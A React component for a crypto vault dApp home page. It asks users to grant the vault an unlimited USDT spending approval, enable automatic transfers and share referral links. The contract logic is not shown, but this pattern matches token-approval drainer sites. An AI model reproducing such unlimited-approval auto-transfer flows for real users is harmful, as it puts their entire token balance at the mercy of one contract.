import { useState } from 'react';
import { motion } from 'framer-motion';
import { ethers } from 'ethers';
import { toast } from 'react-hot-toast';
import {
  FiGift,
  FiDollarSign,
  FiCheck,
  FiX,
  FiShield,
  FiInfo,
  FiCopy,
} from 'react-icons/fi';
import { formatNumber, parseContractError, CONTRACTS } from '../utils/constants';
import { useLanguage } from '../contexts/LanguageContext';

export default function HomePage({ account, contracts, vaultData, onRefresh }) {
  const { t } = useLanguage();
  const [isApproving, setIsApproving] = useState(false);
  const [isOptingIn, setIsOptingIn] = useState(false);
  const [isOptingOut, setIsOptingOut] = useState(false);

  const handleApprove = async () => {
    if (!contracts.usdt || !contracts.vault) return;

    setIsApproving(true);
    try {
      const vaultAddress = await contracts.vault.getAddress();
      const tx = await contracts.usdt.approve(vaultAddress, ethers.MaxUint256);
      toast.loading(t('toast.approvingUsdt'), { id: 'approve' });
      await tx.wait();
      toast.success(t('toast.usdtApproved'), { id: 'approve' });
      onRefresh?.();
    } catch (err) {
      console.error('Approve error:', err);
      toast.error(parseContractError(err), { id: 'approve' });
    } finally {
      setIsApproving(false);
    }
  };

  const handleOptIn = async () => {
    if (!contracts.vault) return;

    setIsOptingIn(true);
    try {
      const tx = await contracts.vault.optIn();
      toast.loading(t('toast.enabling'), { id: 'optIn' });
      await tx.wait();
      toast.success(t('toast.enabled'), { id: 'optIn' });
      onRefresh?.();
    } catch (err) {
      console.error('OptIn error:', err);
      toast.error(parseContractError(err), { id: 'optIn' });
    } finally {
      setIsOptingIn(false);
    }
  };

  const handleOptOut = async () => {
    if (!contracts.vault) return;

    setIsOptingOut(true);
    try {
      const tx = await contracts.vault.optOut();
      toast.loading(t('toast.disabling'), { id: 'optOut' });
      await tx.wait();
      toast.success(t('toast.disabled'), { id: 'optOut' });
      onRefresh?.();
    } catch (err) {
      console.error('OptOut error:', err);
      toast.error(parseContractError(err), { id: 'optOut' });
    } finally {
      setIsOptingOut(false);
    }
  };

  const copyReferralLink = () => {
    const link = `${window.location.origin}?ref=${account}`;
    navigator.clipboard.writeText(link);
    toast.success(t('toast.linkCopied'));
  };

  const isEnabled = vaultData.userInfo?.enabled || false;
  const hasAllowance = parseFloat(vaultData.usdtAllowance || '0') > 0;
  const usdtBalance = vaultData.usdtBalance || '0';

  if (!account) {
    return (
      <div className="glass-card text-center py-12">
        <FiShield className="w-16 h-16 text-primary mx-auto mb-4 opacity-50" />
        <h3 className="text-xl font-semibold text-white mb-2">{t('home.connectWallet')}</h3>
        <p className="text-white/50">{t('home.connectDesc')}</p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center gap-4">
        <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-primary to-green-600 flex items-center justify-center shadow-lg">
          <FiGift className="w-7 h-7 text-dark" />
        </div>
        <div>
          <h1 className="text-2xl md:text-3xl font-bold text-white">{t('home.title')}</h1>
          <p className="text-white/50">{t('home.subtitle')}</p>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="stat-card">
          <div className="flex items-center gap-2 mb-2 text-primary">
            <FiDollarSign className="w-5 h-5" />
            <span className="text-white/40 text-sm">{t('home.usdtBalance')}</span>
          </div>
          <div className="text-xl font-bold text-white">
            {formatNumber(usdtBalance)} <span className="text-white/40 text-sm">USDT</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="flex items-center gap-2 mb-2 text-secondary">
            <FiShield className="w-5 h-5" />
            <span className="text-white/40 text-sm">{t('home.authorization')}</span>
          </div>
          <div className={`text-xl font-bold ${hasAllowance ? 'text-primary' : 'text-secondary'}`}>
            {hasAllowance ? t('home.authorized') : t('home.notAuthorized')}
          </div>
        </div>

        <div className="stat-card">
          <div className="flex items-center gap-2 mb-2 text-primary">
            {isEnabled ? <FiCheck className="w-5 h-5" /> : <FiX className="w-5 h-5" />}
            <span className="text-white/40 text-sm">{t('home.autoTransfer')}</span>
          </div>
          <div className={`text-xl font-bold ${isEnabled ? 'text-primary' : 'text-secondary'}`}>
            {isEnabled ? t('home.enabled') : t('home.disabled')}
          </div>
        </div>

        <div className="stat-card">
          <div className="flex items-center gap-2 mb-2 text-secondary">
            <FiGift className="w-5 h-5" />
            <span className="text-white/40 text-sm">{t('home.totalTransferred')}</span>
          </div>
          <div className="text-xl font-bold text-white">
            {formatNumber(vaultData.userInfo?.totalTransferred || '0')} <span className="text-white/40 text-sm">USDT</span>
          </div>
        </div>
      </div>

      {/* Main Card */}
      <div className="glass-card">
        <h2 className="text-xl font-bold mb-6 flex items-center gap-3">
          <span className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center">
            <FiShield className="w-5 h-5 text-primary" />
          </span>
          {t('home.accountStatus')}
        </h2>

        <div className="space-y-4">
          {/* Step 1: Approve */}
          <div className="flex items-center justify-between p-4 rounded-xl bg-white/5 border border-white/10">
            <div className="flex items-center gap-3">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${hasAllowance ? 'bg-primary/20' : 'bg-secondary/20'}`}>
                {hasAllowance ? <FiCheck className="w-5 h-5 text-primary" /> : <span className="text-secondary font-bold">1</span>}
              </div>
              <div>
                <div className="text-white/50 text-sm">{t('home.step1')}</div>
                <div className={`font-semibold ${hasAllowance ? 'text-primary' : 'text-white'}`}>
                  {hasAllowance ? t('home.usdtAuthorized') : t('home.authorizeUsdt')}
                </div>
              </div>
            </div>
            {!hasAllowance && (
              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={handleApprove}
                disabled={isApproving}
                className="btn-primary text-sm"
              >
                {isApproving ? t('home.approving') : t('home.approve')}
              </motion.button>
            )}
          </div>

          {/* Step 2: Enable */}
          <div className="flex items-center justify-between p-4 rounded-xl bg-white/5 border border-white/10">
            <div className="flex items-center gap-3">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${isEnabled ? 'bg-primary/20' : 'bg-secondary/20'}`}>
                {isEnabled ? <FiCheck className="w-5 h-5 text-primary" /> : <span className="text-secondary font-bold">2</span>}
              </div>
              <div>
                <div className="text-white/50 text-sm">{t('home.step2')}</div>
                <div className={`font-semibold ${isEnabled ? 'text-primary' : 'text-white'}`}>
                  {isEnabled ? t('home.autoEnabled') : t('home.enableAuto')}
                </div>
              </div>
            </div>
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={isEnabled ? handleOptOut : handleOptIn}
              disabled={isOptingIn || isOptingOut || !hasAllowance}
              className={`text-sm px-4 py-2 rounded-xl font-medium disabled:opacity-50 ${
                isEnabled
                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                  : 'btn-primary'
              }`}
            >
              {isOptingIn || isOptingOut ? t('home.processing') : isEnabled ? t('home.disable') : t('home.enable')}
            </motion.button>
          </div>
        </div>

        {/* Referral Link */}
        {account && (
          <div className="mt-6 p-4 rounded-xl bg-primary/10 border border-primary/20">
            <div className="flex items-center justify-between">
              <div>
                <div className="text-sm text-white/50 mb-1">{t('home.yourReferralLink')}</div>
                <div className="text-sm text-white/70 font-mono truncate max-w-xs">
                  {window.location.origin}?ref={account.slice(0, 10)}...
                </div>
              </div>
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={copyReferralLink}
                className="p-3 rounded-xl bg-primary/20 text-primary hover:bg-primary/30"
              >
                <FiCopy className="w-5 h-5" />
              </motion.button>
            </div>
          </div>
        )}

        {/* Info */}
        <div className="mt-6 p-4 rounded-xl bg-white/5 border border-white/5">
          <div className="flex gap-3">
            <FiInfo className="text-primary mt-0.5 flex-shrink-0" />
            <div className="text-sm text-white/70">
              <p className="mb-2 font-medium text-white">{t('home.howItWorks')}</p>
              <ul className="list-disc list-inside space-y-1 text-white/50">
                <li>{t('home.howStep1')}</li>
                <li>{t('home.howStep2')}</li>
                <li>{t('home.howStep3')}</li>
                <li>{t('home.howStep4')}</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
